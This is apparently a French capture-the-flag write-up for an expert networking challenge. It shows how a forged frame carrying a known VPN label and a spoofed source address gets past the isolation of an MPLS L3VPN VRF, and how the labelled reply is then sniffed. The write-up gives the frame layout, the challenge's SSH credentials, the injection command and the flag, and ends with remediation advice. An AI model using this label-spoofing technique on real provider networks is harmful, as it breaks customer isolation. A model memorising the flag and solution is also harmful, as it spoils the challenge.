# Writeup — tunnel-mpls

**Catégorie :** réseau · **Niveau :** expert · **Requiert :** etiquettes
**Flag :** `FPS{label_spoofing_mpls_traverse_l_isolation_vrf}`

## Topologie

```
 CE-C1(192.168.11.2) ─ PE1 ─ P ─ PE2 ─ CE-C2(192.168.22.2, serveur interne)
   site 1 CLIENT-C          │   │
                        (vous, SSH:1346) sur le segment P–PE2 (10.1.23.0/24)
```

CLIENT-C est isolé dans une VRF (L3VPN MPLS, RD/RT `65000:300`). Normalement,
vous ne pouvez pas atteindre `192.168.22.2`.

## Vulnérabilité

Un PE **fait confiance aux paquets déjà étiquetés** reçus sur un lien de cœur :
il **dépile** le label et commute selon sa table VPN (LFIB), **sans vérifier**
la provenance. Si on connaît le **label VPN** de CLIENT-C (obtenu en analysant
la capture du défi `etiquettes` : le trafic vers le serveur `192.168.22.2` porte le
label VPN **1000**), on
peut injecter du trafic directement dans la VRF isolée — c'est le **label
spoofing**.

## Attaque

Depuis le segment P–PE2, on forge une trame :

```
Ether(dst = MAC du PE2)
 / MPLS(label = 1000, s = 1)      <- label VPN de CLIENT-C
  / IP(src = 192.168.11.50, dst = 192.168.22.2)   <- src = site 1 (spoofée)
   / UDP(dport = 5000) / "admin?"
```

Le PE2 dépile le label 1000 → commute dans la VRF CLIENTC → le paquet atteint
le serveur `192.168.22.2`. Celui-ci **répond** vers `192.168.11.50` (site 1) :
sa réponse repart **étiquetée** sur le lien de cœur, où on la **sniffe**.

```
ssh root@<hôte> -p 1346          # MplsSpoof2026
python3 /root/inject.py 1000
# [+] reponse labellisee interceptee -> FPS{label_spoofing_mpls_traverse_l_isolation_vrf}
```

(`solve.py <hôte> 1346` automatise l'injection + le sniff.)

## Remédiation

- Un PE ne doit **jamais** accepter de paquets étiquetés d'un équipement non
  fiable : filtrage aux bordures du domaine MPLS, ports clients en IP pur.
- Sécuriser le plan de contrôle (LDP/BGP authentifiés), isoler physiquement le
  cœur, surveiller les labels inattendus.

## Infra

3 routeurs FRR (PE1/P/PE2) + 2 CE + attaquant, en Docker.
`docker compose up -d --build` puis **`./setup-host.sh`** sur l'hôte
(prérequis noyau/bridge + mode hub sur le segment core + application LDP ;
convergence complète ~1 min). Accès joueur SSH port **1346**. Limites par
conteneur : 0,2–0,4 CPU, 64–256 Mo.
